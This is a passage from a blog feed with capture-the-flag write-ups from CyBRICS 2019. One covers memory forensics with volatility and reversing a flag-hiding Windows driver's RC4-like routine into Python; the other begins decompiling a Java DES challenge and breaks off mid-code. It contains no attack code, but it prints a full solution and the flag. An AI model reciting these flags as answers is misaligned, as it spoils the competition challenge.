    <content type="html"><![CDATA[<blockquote><p>Hidden Flag 220</p></blockquote><blockquote><p><strong>Description</strong>:<br>Hidden Flag (Reverse, Hard, 220 pts) Author: Khanov Artur (awengar)<br>Somebody hides flag in RAM. Catch it<br>Raw dump: <a href="https://cybrics.net/files/20190717.zip.torrent" target="_blank" rel="noopener">https://cybrics.net/files/20190717.zip.torrent</a></p></blockquote><p>I didn’t solve this challenge during the ctf, one of the main reasons was because the challenge was a mix of a <strong>forensics/reverse</strong>, I got stuck on the forensics part, mostly because I don’t have much experience looking at memory dumps, the reversing part was pretty easy after finding the “malicious” binary. </p><h3 id="Forensics-part"><a href="#Forensics-part" class="headerlink" title="Forensics part"></a>Forensics part</h3><p>So we start with a <strong>memdump</strong> and we somehow need to find the flag in memory, I used <a href="https://www.volatilityfoundation.org/" target="_blank" rel="noopener">volatility</a> for this part. The first thing we have to do is to find the most suitable <strong>profile</strong> for the dump, volatility has a command named <strong>imageinfo</strong> which can help us with that:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ volatility -f 20190717.mem imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win2016x64_14393, Win10x64_14393, Win10x64_16299, Win10x64_17134, Win10x64_15063</span><br><span class="line">                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/home/fucker/Downloads/volq/20190717.mem)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x1ad002L</span><br><span class="line">                          KDBG : 0xf8005b5a3520L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff8005a4ee000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xffff800121420000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2019-07-17 23:48:54 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2019-07-17 16:48:54 -0700</span><br></pre></td></tr></table></figure><p>Volatility suggests 5 profiles, <strong>Win10x64_17134</strong> is the most updated so I opted to use that one. This is the part where I got stuck I kept insisting on looking only at processes during the ctf, I used comands like <strong>pslist</strong>, <strong>psxview</strong> etc and I found some interesting processes that weren’t listed in <strong>pslist</strong> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ volatility -f 20190717.mem --profile Win10x64_17134 psxview</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(P)          Name                    PID pslist psscan thrdproc pspcid csrss sessiodn deskthrd ExitTime</span><br><span class="line">------------------ -------------------- ------ ------ ------ -------- ------ ----- ------- -------- --------</span><br><span class="line">... truncated ...</span><br><span class="line">0x000000002736c580 dllhost.exe            5024 False  True   True     False  True  False   True    </span><br><span class="line">... truncated ...</span><br><span class="line">0x0000000070b46a20                      32...2 False  False  False    False  False False   True    </span><br><span class="line">... truncate ...</span><br><span class="line">0x000000001ff17580 dllhost.exe             240 False  True   True     False  False False   False</span><br></pre></td></tr></table></figure><p>As you can see this 3 processes are not shown in <strong>pslist</strong> one of them doesn’t even have a name or a valid PID, I tried to dump the memory of this 3 but I was not able to do it, for some reason volatility was spiting errors, I also dumped part of the registry too trying to find something useful but that also failed.<br>Much later I decided to view the list of kernel drivers loaded on the system, for this I used the <strong>modules</strong> command. This command walks the doubly-linked list of <strong>LDR_DATA_TABLE_ENTRY</strong> structures pointed to <strong>PsLoadedModuleList</strong>. However this cannot find hidden/unlinked kernel drivers but if this doesn’t work we can also try to do a <strong>modscan</strong> which serves that purpose.</p><p>The output of the <strong>modules</strong> command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 20190717.mem --profile Win10x64_17134 modules</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(V)          Name                 Base                             Size File</span><br><span class="line">------------------ -------------------- ------------------ ------------------ ----</span><br><span class="line">... truncated...</span><br><span class="line">0xffffd88ec1e8e010 vmhgfs.sys           0xfffff8005da80000            0x2b000 \SystemRoot\system32\DRIVERS\vmhgfs.sys</span><br><span class="line">0xffffd88ec1fdd8c0 condrv.sys           0xfffff8005dab0000            0x12000 \SystemRoot\System32\drivers\condrv.sys</span><br><span class="line">0xffffd88ec45fb240 WdNisDrv.sys         0xfffff8005dad0000            0x12000 \SystemRoot\system32\drivers\wd\WdNisDrv.sys</span><br><span class="line">0xffffd88eda5c83d0 Flagostor.sys        0xfffff8005daf0000             0x7000 \??\C:\t4est\Flagostor.sys</span><br><span class="line">0xffffd88ec2981480 RamCaptur...er64.SYS 0xfffff8005db00000             0x7000 \??\C:\Users\<span class="built_in">test</span>\Desktop\RamCapturer\x64\RamCaptureDriver64.SYS</span><br></pre></td></tr></table></figure><p>We didn’t even ran <strong>modscan</strong> and we already find two weird drivers that are loaded directly from a strange path <strong>C:\t4est</strong> and <strong>C:\test</strong>, this isn’t normal, the normal thing to happen is to be loaded from the <strong>system32</strong> folder… Obviously <strong>RamCaptureDriver64.sys</strong> is probably what the creator used to dump this memory, so we are left with <strong>flagostor.sys</strong> which already has a weird name and also hints for <strong>flag</strong> after this I used <strong>moddump</strong> to extract this <strong>driver</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ volatility -f 20190717.mem --profile Win10x64_17134 moddump -b 0xfffff8005daf0000 -D .</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Module Base        Module Name          Result</span><br><span class="line">------------------ -------------------- ------</span><br><span class="line">0xfffff8005daf0000 Flagostor.sys        OK: driver.fffff8005daf0000.sys</span><br></pre></td></tr></table></figure><p>Checking what kind of file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file driver.fffff8005daf0000.sys</span><br><span class="line">driver.fffff8005daf0000.sys: PE32+ executable (native) x86-64, <span class="keyword">for</span> MS Windows</span><br></pre></td></tr></table></figure><p>And this is it, the forensics part is over lets go for the reversing part.</p><h3 id="Reversing-part"><a href="#Reversing-part" class="headerlink" title="Reversing part"></a>Reversing part</h3><p>We have now a <strong>PE executable</strong>, I used both <strong>IDA</strong> and <strong>Ghidra</strong>, this time <strong>Ghidra</strong> actually helped me decoding the final part of the decryption function (Pseudo c code was somehow presented better than ida at least from my perspective). I first started analysing with IDA, the main function <strong>sub_FFFFF8005DAF1000</strong> which I renamed later to printLoader in the picture below:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/fui7DWT.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/fui7DWT.png" alt><br></a></p><p>So lets check the next function:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Lwy2i7u.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Lwy2i7u.png" alt><br></a></p><p>Dumping the global variable (Double click on <strong>unk_FFFFF8005DAF3000</strong>):</p><p><a data-fancybox="gallery" href="https://i.imgur.com/LNYKKCK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/LNYKKCK.png" alt><br></a></p><p>Analysing <strong>sub_FFFFF8005DAF1440</strong>: </p><p><a data-fancybox="gallery" href="https://i.imgur.com/eiu2ZQq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/eiu2ZQq.png" alt><br></a></p><p>Since we can convert assembly to pseudo code c in <strong>IDA</strong> we can easily convert this function into python:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/JIeBOdI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/JIeBOdI.png" alt><br></a></p><p>Creating a python script for this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_table</span><span class="params">(key)</span>:</span></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">table.append(i)</span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">iVar1 = ord(key[j%len(key)]) + table[j] + v6</span><br><span class="line">v6 = ((iVar1&amp;<span class="number">0xff</span>) + iVar1) - iVar1</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">aux = table[j]</span><br><span class="line">table[j] = table[v6]</span><br><span class="line">table[v6] = aux</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line"><span class="keyword">return</span> table</span><br></pre></td></tr></table></figure></p><p>The same thing can be done for the <strong>decryptFlag</strong> function in this case I chose to use <strong>GHIDRA</strong> which the pseudo code was a bit more understandable for me at least:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/4iMbw3P.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4iMbw3P.png" alt><br></a></p><p>Once again this could easily be converted to python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_flag</span><span class="params">(table,flagB)</span>:</span></span><br><span class="line">l = len(flagB)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(l):</span><br><span class="line">flag.append(<span class="string">'x'</span>)</span><br><span class="line"></span><br><span class="line">local_38 = <span class="number">0</span>;</span><br><span class="line">local_34 = <span class="number">0</span>;</span><br><span class="line">local_28 = <span class="number">0</span>;</span><br><span class="line">local_20 = l;</span><br><span class="line"><span class="keyword">while</span> (local_28 &lt; local_20):</span><br><span class="line">local_38 = local_38 + <span class="number">1</span> &amp; <span class="number">0xff</span></span><br><span class="line">local_34 = local_34 + table[local_38] &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">aux = table[local_38]</span><br><span class="line">table[local_38] = table[local_34]</span><br><span class="line">table[local_34] = aux</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line"></span><br><span class="line">flag[local_28] = table[table[local_38]+table[local_34] &amp; <span class="number">0xff</span>] ^ ord(flagB[local_28])</span><br><span class="line"></span><br><span class="line">local_28 = local_28 + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag])</span><br></pre></td></tr></table></figure><p>Obviously there was no need to rewrite all of this in python if you manage to run the binary on your computer in my case I wasn’t able to do it in my virtual machine due to some errors that I don’t know, if you could run it you just needed to put a break point in the end and watch the stored values obtaining the flag with ease. The final python script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">flagB = <span class="string">'\x2D\xFB\x9B\xA8\x21\xF8\xB0\xB5\xFA\xEC\x58\xC5\xF9\x35\x57\xFA\xE1\x62\x0E\x19\x45\x7D\x33\x58\x6F\xC9\x88\x4F\x70\x82'</span></span><br><span class="line">key = <span class="string">'qweasdzxc'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_table</span><span class="params">(key)</span>:</span></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">table.append(i)</span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">iVar1 = ord(key[j%len(key)]) + table[j] + v6</span><br><span class="line">v6 = ((iVar1&amp;<span class="number">0xff</span>) + iVar1) - iVar1</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">aux = table[j]</span><br><span class="line">table[j] = table[v6]</span><br><span class="line">table[v6] = aux</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line"><span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_flag</span><span class="params">(table,flagB)</span>:</span></span><br><span class="line">l = len(flagB)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(l):</span><br><span class="line">flag.append(<span class="string">'x'</span>)</span><br><span class="line"></span><br><span class="line">local_38 = <span class="number">0</span>;</span><br><span class="line">local_34 = <span class="number">0</span>;</span><br><span class="line">local_28 = <span class="number">0</span>;</span><br><span class="line">local_20 = l;</span><br><span class="line"><span class="keyword">while</span> (local_28 &lt; local_20):</span><br><span class="line">local_38 = local_38 + <span class="number">1</span> &amp; <span class="number">0xff</span></span><br><span class="line">local_34 = local_34 + table[local_38] &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">aux = table[local_38]</span><br><span class="line">table[local_38] = table[local_34]</span><br><span class="line">table[local_34] = aux</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line"></span><br><span class="line">flag[local_28] = table[table[local_38]+table[local_34] &amp; <span class="number">0xff</span>] ^ ord(flagB[local_28])</span><br><span class="line"></span><br><span class="line">local_28 = local_28 + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> decrypt_flag(generate_table(key), flagB)</span><br></pre></td></tr></table></figure><p>Getting the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python hiddenFlag/hidden.py </span><br><span class="line">cybrics&#123;H1DD3N_D33P_1N_NTKRNL&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>cybrics{H1DD3N_D33P_1N_NTKRNL}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Hidden Flag 220&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;Hidden Flag (Reverse, Hard, 220 pts) Auth
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="volatility" scheme="https://teamrocketist.github.io/tags/volatility/"/>
    
      <category term="memory" scheme="https://teamrocketist.github.io/tags/memory/"/>
    
      <category term="ghidra" scheme="https://teamrocketist.github.io/tags/ghidra/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] CyBRICS CTF Quals 2019 - Matreshka</title>
    <link href="https://teamrocketist.github.io/2019/07/22/Reverse-CyBRICS-CTF-Quals-2019-Matreshka/"/>
    <id>https://teamrocketist.github.io/2019/07/22/Reverse-CyBRICS-CTF-Quals-2019-Matreshka/</id>
    <published>2019-07-22T09:29:14.000Z</published>
    <updated>2019-07-22T11:39:05.518Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Matreshka 50</p></blockquote><blockquote><p><strong>Description</strong>:<br>Matreshka (Reverse, Easy, 50 pts) Author: Khanov Artur (awengar)<br>Matreshka hides flag. Open it<br><a href="https://cybrics.net/files/matreshka.zip" target="_blank" rel="noopener">https://cybrics.net/files/matreshka.zip</a></p></blockquote><h3 id="Decompiling-java"><a href="#Decompiling-java" class="headerlink" title="Decompiling java"></a>Decompiling java</h3><p>After unzipping the file we find 2 files one is a <strong>.class</strong> and an encrypted file. First thing that I did was to decompile the <strong>.class</strong> file I used this website to do it <a href="http://www.decompiler.com" target="_blank" rel="noopener">http://www.decompiler.com</a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Code2</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] var0, String var1) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      SecretKeyFactory var2 = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">      <span class="keyword">byte</span>[] var3 = var1.getBytes();</span><br><span class="line">      DESKeySpec var4 = <span class="keyword">new</span> DESKeySpec(var3);</span><br><span class="line">      SecretKey var5 = var2.generateSecret(var4);</span><br><span class="line">      Cipher var6 = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">      var6.init(<span class="number">2</span>, var5);</span><br><span class="line">      <span class="keyword">byte</span>[] var7 = var6.doFinal(var0);</span><br><span class="line">      <span class="keyword">return</span> var7;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] var0, String var1) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      SecretKeyFactory var2 = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">      <span class="keyword">byte</span>[] var3 = var1.getBytes();</span><br><span class="line">      DESKeySpec var4 = <span class="keyword">new</span> DESKeySpec(var3);</span><br><span class="line">      SecretKey var5 = var2.generateSecret(var4);</span><br><span class="line">      Cipher var6 = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">      var6.init(<span class="number">1</span>, var5);</span><br><span class="line">      <span class="keyword">byte</span>[] var7 = var6.doFinal(var0);</span><br><span class="line">      <span class="keyword">return</span> var7;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String var1 = <span class="string">"matreha!"</span>;</span><br><span class="line">      <span class="keyword">byte</span>[] var2 = encode(System.getProperty(<span class="string">"user.name"</span>).getBytes(), var1);</span><br><span class="line">      <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">76</span>, -<span class="number">99</span>, <span class="number">37</span>, <span class="number">75</span>, -<span class="number">68</span>, <span class="number">10</span>, -<span class="number">52</span>, <span class="number">10</span>, -<span class="number">5</span>, <span class="number">9</span>, <span class="number">92</span>, <span class="number">1</span>, <span class="number">99</span>, -<span class="number">94</span>, <span class="number">105</span>, -<span class="number">18</span>&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3.length; ++var4) &#123;</span><br><span class="line">         <span class="keyword">if</span> (var3[var4] != var2[var4]) &#123;</span><br><span class="line">            System.out.println(<span class="string">"No"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      File var9 = <span class="keyword">new</span> File(<span class="string">"data.bin"</span>);</span><br><span class="line">      FileInputStream var5 = <span class="keyword">new</span> FileInputStream(var9);</span><br><span class="line">      <span class="keyword">byte</span>[] var6 = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>)var9.length()];</span><br><span class="line">      var5.read(var6);</span><br><span class="line">      var5.close();</span><br><span class="line">      <span class="keyword">byte</span>[] var7 = decode(var6, System.getProperty(<span class="string">"user.name"</span>));</span><br><span class="line">      FileOutputStream var8 = <span class="keyword">new</span> FileOutputStream(<span class="string">"stage2.bin"</span>);</span><br><span class="line">      var8.write(var7, <span class="number">0</span>, var7.length);</span><br><span class="line">      var8.flush();</span><br><span class="line">      var8.close();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Interpreting-the-java-file"><a href="#Interpreting-the-java-file" class="headerlink" title="Interpreting the java file"></a>Interpreting the java file</h3><p>Now that we have some java code I started to analyse the <strong>decode</strong> and <strong>encode</strong> functions and we can easily see that the algorithm used for the encryption was <strong>DES</strong>, the encode function <strong>encrypts</strong> an array of bytes with a <strong>key</strong> string, the decode function obviously does the opposite. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] var0, String var1) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     SecretKeyFactory var2 = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">     <span class="keyword">byte</span>[] var3 = var1.getBytes();</span><br><span class="line">     DESKeySpec var4 = <span class="keyword">new</span> DESKeySpec(var3);</span><br><span class="line">     SecretKey var5 = var2.generateSecret(var4);</span><br><span class="line">     Cipher var6 = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">     var6.init(<span class="number">1</span>, var5);</span><br><span class="line">     <span class="keyword">byte</span>[] var7 = var6.doFinal(var0);</span><br><span class="line">     <span class="keyword">return</span> var7;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>By looking at the main function we can see the key used to encrypt the file was an <strong>username</strong> from the machine of the <strong>creator</strong> of the challenge, we don’t know this username but we do know the result of the encryption of this username and the key used:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String var1 = <span class="string">"matreha!"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] var2 = encode(System.getProperty(<span class="string">"user.name"</span>).getBytes(), var1);</span><br><span class="line"><span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">76</span>, -<span class="number">99</span>, <span class="number">37</span>, <span class="number">75</span>, -<span class="number">68</span>, <span class="number">10</span>, -<span class="number">52</span>, <span class="number">10</span>, -<span class="number">5</span>, <span class="number">9</span>, <span class="number">92</span>, <span class="number">1</span>, <span class="number">99</span>, -<span class="number">94</span>, <span class="number">105</span>, -<span class="number">18</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3.length; ++var4) &#123;</span><br><span class="line">   <span class="keyword">if</span> (var3[var4] != var2[var4]) &#123;</span><br><span class="line">      System.out.println(<span class="string">"No"</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can easily reverse this since we have the <strong>key</strong> matreha! we can just use the <strong>decode</strong> function to decrypt the username and use it to decrypt the <strong>stage2.bin</strong>, I did small modifications to the java file and ended up with this:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span 